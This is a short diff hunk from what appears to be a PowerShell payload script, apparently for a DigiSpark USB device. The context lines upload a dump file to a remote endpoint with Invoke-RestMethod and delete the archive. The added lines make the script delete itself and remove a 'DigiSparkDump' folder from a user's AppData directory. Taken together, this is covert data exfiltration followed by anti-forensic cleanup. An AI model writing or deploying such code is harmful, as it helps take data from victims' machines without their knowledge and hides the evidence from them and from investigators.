@@ -447,3 +447,5 @@ Invoke-RestMethod -Uri $endpoint -Method Post -InFile $dumpfile -Headers ${heade
 
 
 Remove-Item "Dump.zip"
+Remove-Item $PSCommandPath -Force 
+Remove-Item "C:\Users\leona\AppData\Local\DigiSparkDump"
